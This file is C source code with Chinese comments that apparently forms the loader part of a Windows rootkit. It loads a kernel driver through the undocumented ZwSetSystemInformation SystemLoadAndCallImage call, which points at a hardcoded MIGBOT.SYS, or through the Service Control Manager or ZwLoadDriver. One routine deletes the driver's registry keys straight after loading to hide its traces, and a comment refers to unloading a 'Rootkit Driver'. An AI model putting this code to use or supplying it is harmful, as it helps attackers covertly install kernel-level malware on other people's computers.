#include "stdafx.h"

#include <windows.h>
#include <stdio.h>

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PVOID Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _STRING {
	USHORT Length;
	USHORT MaximumLength;
	PCHAR Buffer;
} ANSI_STRING, *PANSI_STRING;

typedef unsigned long NTSTATUS;

#define NT_SUCCESS(ntStatus) ((NTSTATUS)(ntStatus) >= 0)


//声明ntdll中使用的函数
typedef DWORD(__stdcall * RTLANSISTRINGTOUNICODESTRING)(PVOID, PVOID, DWORD);
RTLANSISTRINGTOUNICODESTRING  RtlAnsiStringToUnicodeString;

typedef DWORD(__stdcall * RTLFREEUNICODESTRING)(
	IN PUNICODE_STRING UnicodeString
	);
RTLFREEUNICODESTRING  RtlFreeUnicodeString;

typedef DWORD(__stdcall * ZWLOADDRIVER)(
	IN PUNICODE_STRING DriverServiceName
	);

ZWLOADDRIVER  ZwLoadDriver;

typedef enum _SYSTEM_INFORMATION_CLASS {
	//.....
	SystemLoadAndCallImage = 38 //38
	//.....
} SYSTEM_INFORMATION_CLASS;

typedef struct _SYSTEM_LOAD_AND_CALL_IMAGE {
	UNICODE_STRING ModuleName;
} SYSTEM_LOAD_AND_CALL_IMAGE, *PSYSTEM_LOAD_AND_CALL_IMAGE;

typedef NTSTATUS(__stdcall *ZWSETSYSTEMINFORMATION)(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength
	);
ZWSETSYSTEMINFORMATION  ZwSetSystemInformation;

typedef VOID(__stdcall *RTLINITUNICODESTRING)(
	PUNICODE_STRING DestinationString,
	PCWSTR SourceString
	);
RTLINITUNICODESTRING    RtlInitUnicodeString;

/*********************************************************************
**利用ZwSetSystemInformation的SystemLoadAndCallImage功能号加载一个模块加载驱动
*********************************************************************/
BOOL SystemLoadDeviceDriver()
//BOOL SystemLoadDeviceDriver(PCHAR DrvFullPathName)
{
	SYSTEM_LOAD_AND_CALL_IMAGE GregsImage;
	//ANSI_STRING  asDrvFullPathName;

	NTSTATUS ntStatus;

	WCHAR DrvFullPathName[] = L"C:\\WINDOWS\\MIGBOT.SYS";

	//获取RtlInitUnicodeString的地址
	if (!(RtlInitUnicodeString = (RTLINITUNICODESTRING)
		GetProcAddress(GetModuleHandleW(L"ntdll.dll"),
			"RtlInitUnicodeString")))
	{
		return FALSE;
	}

	//获取ZwSetSystemInformation的地址
	if (!(ZwSetSystemInformation = (ZWSETSYSTEMINFORMATION)
		GetProcAddress(GetModuleHandleW(L"ntdll.dll"),
			"ZwSetSystemInformation")))
	{
		return FALSE;
	}

	RtlInitUnicodeString(&(GregsImage.ModuleName),
		DrvFullPathName);

	ntStatus = ZwSetSystemInformation(SystemLoadAndCallImage,
		&GregsImage, sizeof(SYSTEM_LOAD_AND_CALL_IMAGE));
	if (!NT_SUCCESS(ntStatus))
	{
		return FALSE;
	}

	return TRUE;
}
/*********************************************************************/

//*********************************************************************
//利用服务控制器(SCM)加载驱动程序
//*********************************************************************
BOOL SCMLoadDeviceDriver(PCHAR DrvFullPathName, //驱动程序完整路径名称
	PCHAR DriverName) //name of service

{
	SC_HANDLE schSCManager;
	SC_HANDLE schService;

	//Open a handle to the SC Manager database
	schSCManager = OpenSCManager(
		NULL,                   //local machine
		NULL,                   //ServicesActive database
		SC_MANAGER_ALL_ACCESS); //full access rights
	if (NULL == schSCManager)
	{
		//OutputDebugString("OpenSCManager Error!!!");
		return FALSE;
	}

	//install a service in a SCM database
	schService = CreateService(
		schSCManager,   //SCManager database
		DriverName,  //name of service
		DriverName,  //service name to display
		SERVICE_ALL_ACCESS,    //desired access
		SERVICE_KERNEL_DRIVER, //service type
		SERVICE_DEMAND_START,  //start type
		SERVICE_ERROR_NORMAL,  //error control type
		DrvFullPathName, //path to service's binary,TEXT("c:\\boot.sys")
		NULL,   // no load ordering group
		NULL,   // no tag identifier
		NULL,   // no dependencies
		NULL,   // LocalSystem account
		NULL);  // no password
	if (NULL == schService)
	{
		if (GetLastError() == ERROR_SERVICE_EXISTS)
		{
			//service exist
			schService = OpenService(schSCManager,
				DriverName, //DriverName
				SERVICE_ALL_ACCESS);
			if (NULL == schService)
			{
				//OutputDebugString("OpenService Error!!!");
				CloseServiceHandle(schService);
				return FALSE;
			}
		}
		else
		{
			//OutputDebugString("CreateService Error!!!");
			CloseServiceHandle(schService);
			return FALSE;
		}
	}

	//Start the driver service
	if (!StartService(schService, // handle to service
		0,          // number of arguments
		NULL))     // no arguments
	{
		//An instance of the service is already running.
		if (ERROR_SERVICE_ALREADY_RUNNING == GetLastError())
		{
			// no real problem
		}
		else
		{
			CloseServiceHandle(schService);
			CloseServiceHandle(schSCManager);
			return FALSE;
		}
	}

	CloseServiceHandle(schService);
	CloseServiceHandle(schSCManager);
	return TRUE;
}

//**************************************************************************
// 通过SCM卸载驱动程序
// If the operation is successful, returns ERROR_SUCCESS. Otherwise,
// returns a system error code.
//**************************************************************************
DWORD SCMUnloadDeviceDriver(PCHAR DriverName)//Name of service
{
	SC_HANDLE      hSCManager;    // Handle to the service control manager
	SC_HANDLE      hService;// Handle to the service to be stopped
	SERVICE_STATUS ss;

	//OutputDebugString("Unloading Rootkit Driver.\n");

	// Open a handle to the SC Manager database
	hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (NULL == hSCManager)
	{
		//OutputDebugString("OpenSCManager Error.\n");
		return GetLastError();
	}

	// Open a handle to the SC Manager database
	hService = OpenService(hSCManager,  //SCManager database
		DriverName, //Name of service
		SERVICE_ALL_ACCESS);
	if (NULL == hService)
	{
		//OutputDebugString("OpenService Error.");
		CloseServiceHandle(hSCManager);
		return FALSE;
	}

	// Sends a stop code to the main service.
	if (!ControlService(hService, SERVICE_CONTROL_STOP, &ss))
	{
		//OutputDebugString("warning: could not stop service");
		return GetLastError();
	}

	// Marks the specified service for deletion from the service
	// control manager database
	if (!DeleteService(hService))
	{
		//OutputDebugString("warning: could not delete service");
		return FALSE;
	}

	CloseServiceHandle(hService);
	CloseServiceHandle(hSCManager);

	return TRUE;
}

//利用ZwLoadDriver加载驱动
BOOL LoadDeviceDriver(PCHAR DrvFullPathName, //注册表中驱动程序名称
	PCHAR szDrvName) //驱动程序路径名称
{
	//修改注册表启动驱动程序
	char szSubKey[200], szDrvFullPath[256];
	UNICODE_STRING  buf1;
	UNICODE_STRING  buf2;
	int   iBuffLen;
	HKEY  hkResult;
	char  Data[4];
	DWORD dwOK;

	iBuffLen = wsprintf(szSubKey,
		"System\\CurrentControlSet\\Services\\%s", szDrvName);
	szSubKey[iBuffLen] = 0; //以0结尾
	/* HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\szDriveName */
	dwOK = RegCreateKey(HKEY_LOCAL_MACHINE, szSubKey, &hkResult);
	if (dwOK != ERROR_SUCCESS)
		return FALSE;

	Data[0] = 1;
	Data[1] = 0;
	Data[2] = 0;
	Data[3] = 0;

	dwOK = RegSetValueEx(hkResult, "Type", 0, 4,
		(const unsigned char *)Data, 4);
	dwOK = RegSetValueEx(hkResult, "ErrorControl", 0, 4,
		(const unsigned char *)Data, 4);
	dwOK = RegSetValueEx(hkResult, "Start", 0, 4,
		(const unsigned char *)Data, 4);

	//取得驱动程序的完整路径名称
	GetFullPathName(DrvFullPathName, 256, szDrvFullPath, NULL);
	iBuffLen = wsprintf(szSubKey, "\\??\\%s", szDrvFullPath);
	szSubKey[iBuffLen] = 0;
	dwOK = RegSetValueEx(hkResult, "ImagePath", 0, 1,
		(const unsigned char *)szSubKey, iBuffLen);
	RegCloseKey(hkResult);

	//通过ZwLoadDriver加载驱动程序
	iBuffLen = wsprintf(szSubKey,
		"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\%s",
		szDrvName);
	szSubKey[iBuffLen] = 0;
	buf2.Buffer = (PVOID)szSubKey;
	buf2.Length = iBuffLen;

	RtlAnsiStringToUnicodeString = (RTLANSISTRINGTOUNICODESTRING)
		GetProcAddress(GetModuleHandle("ntdll.dll"),
			"RtlAnsiStringToUnicodeString");
	RtlFreeUnicodeString = (RTLFREEUNICODESTRING)
		GetProcAddress(GetModuleHandle("ntdll.dll"),
			"RtlFreeUnicodeString");
	ZwLoadDriver = (ZWLOADDRIVER)
		GetProcAddress(GetModuleHandle("ntdll.dll"),
			"ZwLoadDriver");

	RtlAnsiStringToUnicodeString(&buf1, &buf2, TRUE);

	//加载驱动程序
	ZwLoadDriver(&buf1);
	RtlFreeUnicodeString(&buf1);
	////////////////////////////////////////////////////////////////////

	//删除注册表相应键值
	iBuffLen = wsprintf(szSubKey, "%s%s\\Enum",
		"System\\CurrentControlSet\\Services\\", szDrvName);
	szSubKey[iBuffLen] = 0;
	RegDeleteKey(HKEY_LOCAL_MACHINE, szSubKey);

	iBuffLen = wsprintf(szSubKey, "%s%s\\Security",
		"System\\CurrentControlSet\\Services\\", szDrvName);
	szSubKey[iBuffLen] = 0;
	RegDeleteKey(HKEY_LOCAL_MACHINE, szSubKey);

	iBuffLen = wsprintf(szSubKey, "%s%s",
		"System\\CurrentControlSet\\Services\\", szDrvName);
	szSubKey[iBuffLen] = 0;
	RegDeleteKey(HKEY_LOCAL_MACHINE, szSubKey);

	iBuffLen = wsprintf(szSubKey, "\\\\.\\%s", szDrvName);
	szSubKey[iBuffLen] = 0;

	return TRUE;
}
